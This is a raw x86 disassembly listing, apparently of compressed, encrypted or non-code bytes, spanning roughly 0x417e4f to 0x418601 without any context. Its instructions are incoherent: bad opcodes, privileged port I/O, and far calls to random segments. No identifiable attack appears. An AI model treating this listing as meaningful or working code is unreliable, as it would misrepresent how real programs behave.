  417e4f:	ret    0x18f
  417e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e53:	adc    BYTE PTR [edi+ebp*4],dh
  417e56:	ja     0x417e3f
  417e58:	pop    es
  417e59:	push   edx
  417e5a:	shr    BYTE PTR cs:[edi+0x7a],1
  417e5e:	call   0x3b94cebd
  417e63:	ins    BYTE PTR es:[edi],dx
  417e64:	shr    dl,cl
  417e66:	xchg   edx,eax
  417e67:	arpl   WORD PTR [edi+0x6c],di
  417e6a:	push   es
  417e6b:	mov    WORD PTR [ebx+eiz*1],gs
  417e6e:	gs ffree st(7)
  417e71:	jge    0x417e87
  417e73:	in     eax,dx
  417e74:	pop    edx
  417e75:	mov    al,0x45
  417e77:	jecxz  0x417ead
  417e79:	inc    esp
  417e7a:	push   ebp
  417e7b:	fbstp  TBYTE PTR [ebx]
  417e7d:	test   DWORD PTR [esi],edi
  417e7f:	es js  0x417ecb
  417e82:	scas   eax,DWORD PTR es:[edi]
  417e83:	das    
  417e84:	in     al,0xcf
  417e86:	into   
  417e87:	cmp    eax,0xb065ebc1
  417e8c:	xor    ebp,edi
  417e8e:	xchg   ecx,eax
  417e8f:	mov    esp,0x7cb47960
  417e94:	sub    DWORD PTR [edi-0x9],ebx
  417e97:	sar    edx,1
  417e99:	push   ds
  417e9a:	iret   
  417e9b:	nop
  417e9c:	pop    ss
  417e9d:	(bad)
  417ea0:	mov    BYTE PTR [edi-0x2c],bh
  417ea3:	addr16 pop eax
  417ea6:	inc    ecx
  417ea7:	loop   0x417e95
  417ea9:	add    dh,dl
  417eab:	fwait
  417eac:	ds ja  0x417e6b
  417eaf:	xor    BYTE PTR [eax+0x3a],0xc1
  417eb3:	imul   esp,DWORD PTR [eax+0x7c],0x22fd0a3
  417eba:	dec    esi
  417ebb:	mov    esi,0x2eb51b9a
  417ec0:	push   edi
  417ec1:	aaa    
  417ec2:	mov    cl,0xb5
  417ec4:	push   eax
  417ec5:	das    
  417ec6:	sbb    DWORD PTR [esi+0x6a631e4c],esp
  417ecc:	in     al,0x1e
  417ece:	aas    
  417ecf:	fmul   QWORD PTR [edx]
  417ed1:	pop    ebx
  417ed2:	mov    eax,0xcf3abd87
  417ed7:	fist   DWORD PTR gs:[bx+0x44ca]
  417edd:	pop    es
  417ede:	stos   BYTE PTR es:[edi],al
  417edf:	jnp    0x417ea1
  417ee1:	mov    ds:0x820c0638,al
  417ee6:	mov    es,WORD PTR [ecx-0x2ca14c4]
  417eec:	fimul  WORD PTR [ecx]
  417eee:	ins    BYTE PTR es:[edi],dx
  417eef:	push   eax
  417ef0:	mov    esi,0x29a75264
  417ef5:	cmc    
  417ef6:	xor    edx,edi
  417ef8:	jge    0x417f2f
  417efa:	mov    edx,0x50f69f85
  417eff:	mov    bh,0xe
  417f01:	inc    ebx
  417f02:	sbb    DWORD PTR [edx],0xffffffa7
  417f05:	sbb    DWORD PTR [edi+eiz*2+0x55f230b8],eax
  417f0c:	imul   BYTE PTR [edx+ebp*1]
  417f0f:	fnsave [eax-0x71ed306c]
  417f15:	fwait
  417f16:	xchg   ebx,eax
  417f17:	ds mov bh,0x55
  417f1a:	out    dx,eax
  417f1b:	lahf   
  417f1c:	sbb    dh,BYTE PTR [edi*1+0x696df1b7]
  417f23:	lds    esp,FWORD PTR [edx+0x79]
  417f26:	sbb    ecx,DWORD PTR [ecx-0x3935036b]
  417f2c:	rol    BYTE PTR [ebp+0x3655fd3f],1
  417f32:	mov    ds:0xafd12604,eax
  417f37:	aas    
  417f38:	nop
  417f39:	popa   
  417f3a:	cmp    BYTE PTR [ebp+edi*2-0x2a1488f],bl
  417f41:	push   cs
  417f42:	sbb    BYTE PTR [eax+esi*2+0x59],0x24
  417f47:	xor    bh,ch
  417f49:	mov    ebp,0xbde841a5
  417f4e:	out    dx,al
  417f4f:	fadd   QWORD PTR [ebx]
  417f51:	not    DWORD PTR [edx]
  417f53:	mov    dl,0xfa
  417f55:	adc    edi,DWORD PTR [eax+0x42]
  417f58:	or     DWORD PTR [ebx+0x3e448ba5],ebx
  417f5e:	(bad)  
  417f5f:	cmp    BYTE PTR [edi+0x5f],dh
  417f62:	or     ah,BYTE PTR [edx-0x4d]
  417f65:	idiv   DWORD PTR [ebx-0x605a97a8]
  417f6b:	and    BYTE PTR [edx+0x3a2fef60],bh
  417f71:	jo     0x417f56
  417f73:	dec    eax
  417f74:	in     eax,dx
  417f75:	mov    ah,0xa2
  417f77:	(bad)  [ebx]
  417f79:	jge    0x417f37
  417f7b:	dec    eax
  417f7c:	pop    eax
  417f7d:	inc    ecx
  417f7e:	js     0x417f6d
  417f80:	xor    al,0xbc
  417f82:	loopne 0x417fbf
  417f84:	lds    ebx,FWORD PTR [edx+ebp*8-0x3dbb458d]
  417f8b:	aad    0xbd
  417f8d:	test   DWORD PTR [ebp-0x25b4ac70],eax
  417f93:	dec    esp
  417f94:	jo     0x417f18
  417f96:	sbb    DWORD PTR [ebp+0x19],ebp
  417f99:	ds push 0x1b1864bc
  417f9f:	xchg   ebx,eax
  417fa0:	sbb    ch,BYTE PTR [esi]
  417fa2:	jecxz  0x417fae
  417fa4:	loop   0x417f3e
  417fa6:	retf   
  417fa7:	fistp  DWORD PTR [edi-0x44896530]
  417fad:	fst    QWORD PTR [edi+0x59]
  417fb0:	jb     0x41802a
  417fb2:	mov    eax,0xce5bfa98
  417fb7:	daa    
  417fb8:	mov    dh,0xbb
  417fba:	in     al,dx
  417fbb:	adc    bl,dh
  417fbd:	sub    al,0xeb
  417fbf:	inc    ecx
  417fc0:	push   0xffffff81
  417fc2:	cld    
  417fc3:	mov    edi,0x37acea13
  417fc8:	xor    ah,BYTE PTR [ecx-0x49826d72]
  417fce:	daa    
  417fcf:	xlat   BYTE PTR ss:[ebx]
  417fd1:	sub    edx,DWORD PTR [eax]
  417fd3:	stos   BYTE PTR es:[edi],al
  417fd4:	stc    
  417fd5:	out    dx,al
  417fd6:	inc    ecx
  417fd7:	in     eax,dx
  417fd8:	push   esp
  417fd9:	xor    BYTE PTR [ebp+0x2f],ch
  417fdc:	mov    eax,ds:0x10434a2e
  417fe1:	pop    ss
  417fe2:	pop    ss
  417fe3:	xchg   DWORD PTR [esi],edi
  417fe5:	fdiv   QWORD PTR [esi-0x10]
  417fe8:	mov    ebp,0x6893e34f
  417fed:	(bad)  
  417fee:	push   0x35f135d2
  417ff3:	ins    BYTE PTR es:[edi],dx
  417ff4:	test   ebx,esp
  417ff6:	cmp    BYTE PTR [ebx],ch
  417ff8:	inc    eax
  417ff9:	dec    eax
  417ffa:	jg     0x417faa
  417ffc:	aam    0x59
  417ffe:	cmc    
  417fff:	xchg   ebp,eax
  418000:	add    dl,BYTE PTR [ecx+0x2764ca9c]
  418006:	bswap  esi
  418008:	sub    edi,ecx
  41800a:	pop    edi
  41800b:	xor    dh,ah
  41800d:	inc    ebp
  41800e:	sub    esp,DWORD PTR [edx-0x7a]
  418011:	call   0x5311:0xbb19c356
  418018:	ror    DWORD PTR [edi-0x41],0x34
  41801c:	cmp    DWORD PTR [ecx+0x25],ecx
  41801f:	mov    esp,0xf4a5c683
  418024:	scas   al,BYTE PTR es:[edi]
  418025:	and    bh,BYTE PTR [esi-0x65]
  418028:	ins    DWORD PTR es:[di],dx
  41802a:	or     edx,ebx
  41802c:	add    dh,ch
  41802e:	cmc    
  41802f:	loop   0x41805d
  418031:	mov    ds,WORD PTR [edx+0xe]
  418034:	xor    BYTE PTR [ebx+0xa],cl
  418037:	repnz push ebx
  418039:	xor    eax,0x9ca4f095
  41803e:	out    dx,al
  41803f:	sbb    eax,0xa1eac6b9
  418044:	dec    eax
  418045:	je     0x4180a2
  418047:	and    dh,BYTE PTR [esi+0x16dfd815]
  41804d:	xchg   BYTE PTR [ebx+0x79d59671],bl
  418053:	inc    ebp
  418054:	fdivr  st,st(1)
  418056:	cmp    eax,0xbc785010
  41805b:	std    
  41805c:	mov    ds:0x50d25aff,ax
  418062:	inc    ebx
  418063:	in     eax,0xe9
  418065:	push   ebp
  418066:	or     BYTE PTR [ecx],ah
  418068:	mov    cl,al
  41806a:	into   
  41806b:	xchg   DWORD PTR [edx],ecx
  41806d:	shl    BYTE PTR [esi-0x69bb946],0xca
  418074:	retf   
  418075:	ins    BYTE PTR es:[edi],dx
  418076:	stc    
  418077:	inc    ecx
  418078:	stc    
  418079:	add    bl,bh
  41807b:	aad    0x93
  41807d:	jb     0x4180d6
  41807f:	push   edi
  418080:	pop    ebx
  418081:	inc    ebx
  418082:	mov    bh,BYTE PTR [edi+0x4c]
  418085:	fcmovnb st,st(3)
  418087:	pop    ecx
  418088:	push   ebx
  418089:	enter  0xdd60,0xd2
  41808d:	arpl   WORD PTR [ebx+edx*1],bp
  418090:	fmul   QWORD PTR [esi+0x41]
  418093:	and    edi,edi
  418095:	ret    
  418096:	dec    edi
  418097:	fsubr  QWORD PTR [ebx]
  418099:	enter  0xbf99,0x5c
  41809d:	in     al,0xce
  41809f:	js     0x41807f
  4180a1:	mov    ch,0x46
  4180a3:	aad    0xd1
  4180a5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180a7:	mov    dh,0x96
  4180a9:	cmp    BYTE PTR [edi-0x47b22531],dl
  4180af:	scas   al,BYTE PTR es:[edi]
  4180b0:	add    bl,BYTE PTR [ecx]
  4180b2:	jmp    0x9a8b9920
  4180b7:	pop    es
  4180b8:	aas    
  4180b9:	mov    ebx,0xe3fd2ee4
  4180be:	lods   al,BYTE PTR ds:[esi]
  4180bf:	mov    al,ds:0x4899ca24
  4180c4:	and    dl,BYTE PTR [esp+ebp*1+0x4]
  4180c8:	repnz in al,0xd9
  4180cb:	or     eax,0xad484a03
  4180d0:	xchg   BYTE PTR [eax],dl
  4180d2:	mov    BYTE PTR [eax+0x71],ch
  4180d5:	lahf   
  4180d6:	(bad)  
  4180d7:	mov    ebp,0xa619a9ce
  4180dc:	add    DWORD PTR [ebp-0x59e7bb01],edi
  4180e2:	das    
  4180e3:	adc    DWORD PTR [edx],esi
  4180e5:	inc    ecx
  4180e6:	sbb    ebp,edi
  4180e8:	scas   al,BYTE PTR es:[edi]
  4180e9:	lods   eax,DWORD PTR ds:[esi]
  4180ea:	or     BYTE PTR [esi-0x15e6c87c],bh
  4180f0:	pop    edi
  4180f1:	mov    edi,0x7114bc02
  4180f6:	cmp    BYTE PTR [ecx+0x18502050],dl
  4180fc:	add    dh,BYTE PTR [eax+ecx*2+0x1b]
  418100:	or     BYTE PTR [esi-0x185b3d58],dl
  418106:	or     eax,0xba37a9c1
  41810b:	jb     0x418141
  41810d:	sbb    BYTE PTR fs:[esi],ah
  418110:	rcl    BYTE PTR [ecx],0x20
  418113:	std    
  418114:	mov    DWORD PTR [edx-0x71],edx
  418117:	cmp    BYTE PTR [eax-0x2fffb218],0x6c
  41811e:	leave  
  41811f:	jge    0x4180e8
  418121:	pop    ecx
  418122:	cdq    
  418123:	cmp    cl,BYTE PTR [edx]
  418125:	lods   eax,DWORD PTR ds:[esi]
  418126:	mov    bh,0x4a
  418128:	in     al,0xde
  41812a:	fs sti 
  41812c:	pop    ecx
  41812d:	inc    ebp
  41812e:	xor    edi,DWORD PTR ds:[eax-0x38]
  418132:	xchg   ebx,eax
  418133:	stc    
  418134:	push   eax
  418135:	sub    al,0x3c
  418137:	mov    ebx,0xc8ff4752
  41813c:	mov    al,BYTE PTR [edx]
  41813e:	popf   
  41813f:	inc    edx
  418140:	adc    eax,0xb05dabe1
  418145:	mov    ds:0x27b1f793,eax
  41814a:	sub    DWORD PTR [edx-0x5a],ecx
  41814d:	aam    0x95
  41814f:	pop    ecx
  418150:	jae    0x41812c
  418152:	lds    eax,FWORD PTR [edx+0x25]
  418155:	mov    cl,0xda
  418157:	lock add eax,esp
  41815a:	add    DWORD PTR [eax],0x589d2905
  418160:	call   0x76ec:0x610e2e7a
  418167:	xchg   edx,eax
  418168:	test   eax,0xb75bc265
  41816d:	pop    ecx
  41816e:	or     eax,0xb88bc53d
  418173:	in     eax,dx
  418174:	out    0x66,eax
  418176:	test   DWORD PTR [ebx],0xe54b717c
  41817c:	cwde   
  41817d:	add    al,0x16
  41817f:	scas   eax,DWORD PTR es:[edi]
  418180:	push   ecx
  418181:	ins    BYTE PTR es:[edi],dx
  418182:	stc    
  418183:	cmp    al,0xb2
  418185:	aaa    
  418186:	cdq    
  418187:	and    eax,0x586dbea
  41818c:	push   eax
  41818d:	cmp    esp,DWORD PTR [edx-0x65bf2155]
  418193:	gs cmp ch,al
  418196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418198:	fwait
  418199:	addr16 sti 
  41819b:	push   ebx
  41819c:	repnz sub ah,ah
  41819f:	(bad)  
  4181a0:	in     eax,dx
  4181a1:	mov    al,0xa9
  4181a3:	mov    fs,edx
  4181a5:	ret    0x6a5c
  4181a8:	loop   0x4181fb
  4181aa:	and    cl,ch
  4181ac:	mov    ah,0x11
  4181ae:	idiv   DWORD PTR [ebx+esi*8]
  4181b1:	(bad)  
  4181b3:	push   ebp
  4181b4:	sbb    al,0x32
  4181b6:	outs   dx,BYTE PTR ds:[esi]
  4181b7:	mov    dh,0xa1
  4181b9:	cmp    DWORD PTR [edi-0x7d1a2f4],edi
  4181bf:	addr16 fwait
  4181c1:	push   edx
  4181c2:	imul   esi,DWORD PTR [ebp+edi*2-0x45],0xcd5301cb
  4181ca:	push   ebx
  4181cb:	mov    ch,0x1e
  4181cd:	addr16 ret 
  4181cf:	push   0x132adb31
  4181d4:	dec    edx
  4181d5:	out    dx,al
  4181d6:	pop    es
  4181d7:	mov    edi,0xecd3dd75
  4181dc:	push   ss
  4181dd:	repz jae 0x418254
  4181e0:	push   es
  4181e1:	jns    0x4181ce
  4181e3:	push   ebx
  4181e4:	dec    ebx
  4181e5:	xor    eax,0xa6dcbdb1
  4181ea:	dec    esp
  4181eb:	out    dx,eax
  4181ec:	mov    ds:0x1b109010,al
  4181f1:	inc    eax
  4181f2:	adc    eax,0xa24769f7
  4181f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181f8:	das    
  4181f9:	stos   BYTE PTR es:[edi],al
  4181fa:	sub    BYTE PTR [ebp+0x3c],dh
  4181fd:	mov    al,0xdd
  4181ff:	fstp   DWORD PTR [eax+0x79]
  418202:	test   BYTE PTR [ecx],dh
  418204:	mov    ecx,0x1dd87430
  418209:	pushf  
  41820a:	fadd   QWORD PTR fs:[ecx+0x35e0c52c]
  418211:	cdq    
  418212:	push   ds
  418213:	mov    al,ds:0x8ab662e5
  418218:	pusha  
  418219:	sub    eax,0x9870a5c0
  41821e:	push   ecx
  41821f:	push   esp
  418220:	xlat   BYTE PTR ds:[ebx]
  418221:	pop    ebx
  418222:	mov    ds:0x86aeca2b,al
  418227:	mul    BYTE PTR [esi+0x580b0254]
  41822d:	cmp    bh,BYTE PTR [esi-0x95d94cf]
  418233:	stos   BYTE PTR es:[edi],al
  418234:	jl     0x41821d
  418236:	mov    ch,0x23
  418238:	js     0x418262
  41823a:	leave  
  41823b:	xor    BYTE PTR [edi-0x4b986843],dl
  418241:	andnps xmm4,XMMWORD PTR [eax]
  418244:	lahf   
  418245:	xor    BYTE PTR [ebx],al
  418247:	je     0x4182a6
  418249:	cmp    eax,0xb32b3958
  41824e:	dec    ebx
  41824f:	mov    ecx,0xceb6c425
  418254:	es xor al,0x97
  418257:	jbe    0x41824a
  418259:	mov    ebp,0xba347df6
  41825e:	push   es
  41825f:	inc    esi
  418260:	(bad)  
  418261:	out    dx,eax
  418262:	and    dl,BYTE PTR [edx-0x42bc97b7]
  418268:	pop    ds
  418269:	push   ss
  41826a:	xchg   ebp,eax
  41826b:	mov    bh,0xe5
  41826d:	cs out 0xc7,al
  418270:	cmp    al,0xe7
  418272:	daa    
  418273:	stos   BYTE PTR es:[edi],al
  418274:	add    bh,BYTE PTR [ebp-0x30]
  418277:	or     BYTE PTR [eax-0x2c],0xf5
  41827b:	xchg   esi,eax
  41827c:	dec    ecx
  41827d:	cli    
  41827e:	mov    bl,0x38
  418280:	rol    esp,1
  418282:	mov    ch,0xa2
  418284:	jo     0x418251
  418286:	jge    0x418218
  418288:	(bad)  
  418289:	aas    
  41828a:	mov    bl,0xa6
  41828c:	pop    es
  41828d:	push   ecx
  41828e:	aaa    
  41828f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418290:	and    ebp,esi
  418292:	test   DWORD PTR [ecx+ebp*8+0x71345ba3],0xca8d7e65
  41829d:	cmc    
  41829e:	dec    esp
  41829f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182a0:	sahf   
  4182a1:	pop    ebp
  4182a2:	scas   al,BYTE PTR es:[edi]
  4182a3:	fisubr WORD PTR [edi-0x7daac17]
  4182a9:	dec    esi
  4182aa:	shr    BYTE PTR gs:[eax],0x20
  4182ae:	mov    BYTE PTR [edx],ch
  4182b0:	mov    BYTE PTR [ecx-0x79cb7da1],0xf9
  4182b7:	cmp    eax,0x4367c460
  4182bc:	and    dl,bl
  4182be:	dec    edi
  4182bf:	sub    BYTE PTR [ebx+0x12],ch
  4182c2:	jns    0x4182c5
  4182c4:	shl    BYTE PTR [ecx-0x44],0x82
  4182c8:	popa   
  4182c9:	lods   eax,DWORD PTR ds:[esi]
  4182ca:	mov    dl,0x71
  4182cc:	xchg   DWORD PTR [esi-0x6d],esi
  4182cf:	push   ds
  4182d0:	mov    dh,0x1c
  4182d2:	cmp    al,0x46
  4182d4:	xchg   edi,eax
  4182d5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4182d7:	adc    eax,0xca676eb9
  4182dc:	out    dx,eax
  4182dd:	pop    edi
  4182de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182df:	or     dh,BYTE PTR ds:0xdda746f0
  4182e5:	push   eax
  4182e6:	lock retf 
  4182e8:	loope  0x4182e1
  4182ea:	adc    dh,ah
  4182ec:	or     BYTE PTR [ebx-0x2c],0x62
  4182f0:	push   esi
  4182f1:	cli    
  4182f2:	mov    cl,dl
  4182f4:	add    DWORD PTR [ebp+0x87a59c9],edx
  4182fa:	sub    ebp,DWORD PTR [ebx]
  4182fc:	jg     0x4182be
  4182fe:	jmp    0x98bf:0xf8f77aba
  418305:	jne    0x4182b7
  418307:	fisttp DWORD PTR [edx]
  418309:	xor    al,0xdf
  41830b:	mov    dl,BYTE PTR [eax]
  41830d:	xlat   BYTE PTR fs:[ebx]
  41830f:	adc    BYTE PTR [edx+0xf],0x1d
  418313:	es inc ecx
  418315:	ficomp WORD PTR [esp+eax*8]
  418318:	outs   dx,BYTE PTR ds:[esi]
  418319:	mov    ch,0x6b
  41831b:	jmp    0x28fb:0xbddbff88
  418322:	xchg   ebx,eax
  418323:	xchg   esp,eax
  418325:	sub    DWORD PTR [ebx+edx*8-0x12278ce8],edi
  41832c:	inc    ecx
  41832d:	sbb    al,0x66
  41832f:	or     bh,BYTE PTR [ecx]
  418331:	repnz mov WORD PTR [edi-0x5a],ss
  418335:	push   0x6bd3dd4e
  41833a:	ret    0x4024
  41833d:	lods   al,BYTE PTR ds:[esi]
  41833e:	popa   
  41833f:	jnp    0x418334
  418341:	neg    BYTE PTR [ebp+0x480efeee]
  418347:	xor    BYTE PTR [ecx*1+0x4008903f],ch
  41834e:	xor    ah,ch
  418350:	mov    dh,0x53
  418352:	jae    0x4182e5
  418354:	mov    edi,0xdc767627
  418359:	scas   eax,DWORD PTR es:[edi]
  41835a:	or     eax,DWORD PTR [ebp-0x58]
  41835d:	std    
  41835e:	sbb    bl,ch
  418360:	test   al,0x16
  418362:	pop    esi
  418363:	jmp    0xc24ca2b1
  418368:	pop    edx
  418369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41836a:	call   0x418c:0xb6d1f5ed
  418371:	cmp    al,0x5c
  418373:	mov    ch,0x5b
  418375:	sub    al,0xc3
  418377:	mov    ah,0xbf
  418379:	int    0x87
  41837b:	cli    
  41837c:	out    dx,al
  41837d:	stos   BYTE PTR es:[edi],al
  41837e:	push   ebp
  41837f:	or     ebx,DWORD PTR [ebx]
  418381:	mov    ds:0x6ae387ab,eax
  418386:	aad    0x80
  418388:	inc    ebp
  418389:	sub    BYTE PTR [ebx-0x471098fa],0x72
  418390:	xor    edx,ebp
  418392:	out    0x80,eax
  418394:	gs and ecx,ebx
  418397:	lock xchg ebx,eax
  418399:	xchg   ebx,eax
  41839a:	lahf   
  41839b:	repnz pop edi
  41839d:	or     BYTE PTR [edi],0x1
  4183a0:	call   0x3bbf:0x2c0b56fd
  4183a7:	add    esp,0xffffffe8
  4183aa:	shl    BYTE PTR [eax],cl
  4183ac:	mov    ecx,0x35af679b
  4183b1:	sbb    ebp,DWORD PTR [ebx+0x17]
  4183b4:	mov    eax,ds:0x3e3dc14
  4183b9:	inc    esp
  4183ba:	or     BYTE PTR [ebx+0x623fd9b5],dl
  4183c0:	scas   al,BYTE PTR es:[edi]
  4183c1:	sub    ebx,eax
  4183c3:	mov    al,ds:0x12a208c8
  4183c8:	jno    0x41837c
  4183ca:	mov    eax,DWORD PTR [ecx+0x5624f973]
  4183d0:	and    ebx,DWORD PTR [ebx-0x2e]
  4183d3:	pushf  
  4183d4:	fldcw  WORD PTR [ebp+0x2d]
  4183d7:	ins    DWORD PTR es:[edi],dx
  4183d8:	dec    edx
  4183d9:	cdq    
  4183da:	dec    edi
  4183db:	mov    eax,0x296b4a91
  4183e0:	inc    esp
  4183e1:	jmp    0xc230e43a
  4183e6:	pop    ebx
  4183e7:	lds    edi,FWORD PTR [edi+edi*4]
  4183ea:	add    DWORD PTR fs:[edx-0x4f],esp
  4183ee:	inc    ebp
  4183ef:	jns    0x41845a
  4183f1:	dec    esp
  4183f2:	pop    esp
  4183f3:	jge    0x41842c
  4183f5:	jecxz  0x418452
  4183f7:	push   edi
  4183f8:	repz jecxz 0x418404
  4183fb:	hlt    
  4183fc:	shl    BYTE PTR [ebx-0x6b714058],0x43
  418403:	xor    ah,ah
  418405:	jbe    0xec657709
  41840b:	es mov bl,bl
  41840e:	pushf  
  41840f:	repz mov ebx,0x31e605b1
  418415:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  418417:	push   es
  418418:	xor    BYTE PTR [ecx+0x6b],0x24
  41841c:	sbb    al,0x52
  41841e:	push   cs
  41841f:	jle    0x418411
  418421:	outs   dx,DWORD PTR ds:[esi]
  418422:	mov    dh,bh
  418424:	(bad)  
  418425:	mov    eax,0x5f139ba5
  41842a:	test   al,0x11
  41842c:	add    DWORD PTR [edi-0x3da44294],ebx
  418432:	not    BYTE PTR [ebx+0x593bf316]
  418438:	stc    
  418439:	ret    
  41843a:	inc    ebp
  41843b:	or     BYTE PTR [ebx-0x6e],dl
  41843e:	push   cs
  41843f:	jge    0x4183c2
  418441:	test   al,0xf3
  418443:	enter  0x1e14,0x6a
  418447:	imul   edi,DWORD PTR cs:[edi+0xc],0xdc065fa5
  41844f:	out    dx,eax
  418450:	inc    ebp
  418451:	add    edi,DWORD PTR [esi+0x30]
  418454:	rcl    edx,cl
  418456:	mov    bl,0x4f
  418458:	push   cs
  418459:	js     0x4183e5
  41845b:	cld    
  41845c:	lods   al,BYTE PTR ds:[esi]
  41845d:	sbb    dh,cl
  41845f:	push   esp
  418460:	mov    dl,BYTE PTR [edx+0x49a8116]
  418466:	xchg   edx,eax
  418467:	cld    
  418468:	jno    0x4183f9
  41846a:	pop    ds
  41846b:	mov    eax,0x8c504aba
  418470:	loopne 0x4184b0
  418472:	add    DWORD PTR fs:[edx-0xa8fc0eb],esi
  418479:	clc    
  41847a:	in     al,dx
  41847b:	dec    edx
  41847c:	pop    ebx
  41847d:	mov    esi,0x48da350e
  418482:	mov    eax,ds:0x55007f21
  418487:	pop    ds
  418488:	test   eax,0x971477f1
  41848d:	mov    ebx,edi
  41848f:	retf   0x7f63
  418492:	push   es
  418493:	pop    ebp
  418494:	popa   
  418495:	retf   0xe97c
  418498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418499:	mov    dh,0x7f
  41849b:	mov    dh,0x36
  41849d:	cdq    
  41849e:	dec    esi
  41849f:	jmp    0x4aa27c6c
  4184a4:	ins    BYTE PTR es:[edi],dx
  4184a5:	jle    0x4184e3
  4184a7:	push   ebp
  4184a8:	mov    ah,0xbc
  4184aa:	sub    dl,BYTE PTR [edx]
  4184ac:	push   eax
  4184ad:	inc    edx
  4184ae:	and    DWORD PTR ds:0x8c2f74d9,ebx
  4184b4:	mov    esi,0xea900598
  4184b9:	dec    ecx
  4184ba:	gs sbb bl,dl
  4184bd:	psllq  mm5,QWORD PTR [ecx+0x1d5edb8a]
  4184c4:	cmp    DWORD PTR [ebp+0x7b],eax
  4184c7:	mov    edx,0xf367a1df
  4184cc:	lods   al,BYTE PTR ds:[esi]
  4184cd:	mov    dl,0x2a
  4184cf:	(bad)  
  4184d0:	cmp    DWORD PTR [ebp+0x3b],ebx
  4184d3:	push   ebx
  4184d4:	sbb    BYTE PTR [edi+0x6e8324ef],0xa5
  4184db:	cli    
  4184dc:	cmc    
  4184dd:	in     al,0x9a
  4184df:	sub    DWORD PTR [ebx-0x7965cd85],0xfc034e48
  4184e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ea:	call   0x4454:0x24dee40a
  4184f1:	retf   
  4184f2:	inc    edi
  4184f3:	sbb    bl,bh
  4184f5:	and    bh,BYTE PTR [edx-0x8]
  4184f8:	mov    ds:0x29bea025,eax
  4184fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184fe:	pop    ds
  4184ff:	dec    edi
  418500:	cmp    DWORD PTR [edi+ecx*4],0xffffffcb
  418504:	cmp    BYTE PTR [edi+0x3e37adf1],ch
  41850a:	cmp    al,0x65
  41850c:	mov    ch,0x14
  41850e:	xor    esp,0x2b
  418511:	mov    al,0x2b
  418513:	pshufw mm0,mm0,0x5a
  418517:	xlat   BYTE PTR ds:[ebx]
  418518:	test   DWORD PTR [esi-0x49729c],ebx
  41851e:	(bad)  
  418520:	add    dl,bl
  418522:	mov    ah,0x6d
  418524:	repnz retf 0xc0c7
  418528:	sahf   
  418529:	adc    al,0xda
  41852b:	in     al,0x9
  41852d:	pop    esp
  41852e:	rol    BYTE PTR [edi],0xa0
  418531:	out    dx,al
  418532:	sbb    DWORD PTR [ebp+0x43],edx
  418535:	inc    edx
  418536:	mov    edx,0x2ebf996
  41853b:	mov    bh,BYTE PTR [esp+ebp*4-0x61]
  41853f:	popa   
  418540:	popf   
  418541:	sub    eax,0x44a33427
  418546:	mov    DWORD PTR [edi-0x77],esi
  418549:	dec    edx
  41854a:	ds add dl,cl
  41854d:	xchg   ebp,eax
  41854e:	jne    0x418544
  418550:	les    edi,FWORD PTR [ebp+0x1c093c3b]
  418556:	imul   edi,DWORD PTR [ecx],0xffffffa4
  418559:	shl    DWORD PTR [edx+0xc],1
  41855c:	xchg   bh,cl
  41855e:	lea    esp,[esi]
  418560:	push   ds
  418561:	cli    
  418562:	sbb    al,ah
  418564:	mov    bh,0xd
  418566:	adc    edi,DWORD PTR [ebp-0x5c]
  418569:	dec    eax
  41856a:	inc    eax
  41856b:	imul   ebx,DWORD PTR [ecx+0x740c8d74],0x62
  418572:	or     ch,BYTE PTR [edx]
  418574:	xchg   ebp,eax
  418575:	ret    
  418576:	lods   al,BYTE PTR ds:[esi]
  418577:	shl    al,cl
  418579:	ja     0x418567
  41857b:	jmp    0x418590
  41857d:	add    DWORD PTR [eax],esp
  41857f:	pop    ds
  418580:	das    
  418581:	add    esp,DWORD PTR [edi+0x45e3529]
  418587:	add    al,0x74
  418589:	in     eax,0x67
  41858b:	inc    edx
  41858c:	pop    ss
  41858d:	call   0x7125:0x4863bd6d
  418594:	xlat   BYTE PTR ds:[ebx]
  418595:	sbb    eax,0x9a32d3b8
  41859a:	sbb    BYTE PTR [edi],0x24
  41859d:	or     edx,edi
  41859f:	lods   eax,DWORD PTR ds:[esi]
  4185a0:	cdq    
  4185a1:	dec    esi
  4185a2:	mul    al
  4185a4:	dec    ecx
  4185a5:	cmp    al,0x57
  4185a7:	xchg   edx,eax
  4185a8:	cmp    cl,BYTE PTR [eax-0x79]
  4185ab:	fwait
  4185ac:	out    dx,eax
  4185ad:	call   0xe8ca9674
  4185b2:	ins    DWORD PTR es:[edi],dx
  4185b3:	imul   edx,DWORD PTR [ebx]
  4185b6:	add    dh,bl
  4185b8:	pop    es
  4185b9:	mov    esp,DWORD PTR [ebp-0x61]
  4185bc:	and    eax,0xf55fbc86
  4185c1:	cs pop ds
  4185c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185c4:	xlat   BYTE PTR ds:[ebx]
  4185c5:	scas   al,BYTE PTR es:[edi]
  4185c6:	push   edx
  4185c7:	popa   
  4185c8:	stc    
  4185c9:	gs cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185cc:	aaa    
  4185cd:	sbb    eax,0x854d0a5f
  4185d2:	cmp    BYTE PTR [edx-0x6],cl
  4185d5:	push   edx
  4185d6:	dec    edi
  4185d7:	mov    ds:0x1e27345a,al
  4185dc:	fadd   DWORD PTR [ebp+edx*4-0x1d75eb8]
  4185e3:	push   edx
  4185e4:	mul    BYTE PTR [ebx-0x66]
  4185e7:	mov    esp,0x65478795
  4185ec:	mov    ah,bl
  4185ee:	jne    0x418660
  4185f0:	jno    0x41864b
  4185f2:	sbb    dh,ch
  4185f4:	jne    0x4185c3
  4185f6:	jno    0x4185c1
  4185f8:	out    0xad,eax
  4185fa:	dec    edx
  4185fb:	jg     0x41864c
  4185fd:	jecxz  0x418613
  4185ff:	repz push ecx
  418601:	xor    esi,ecx
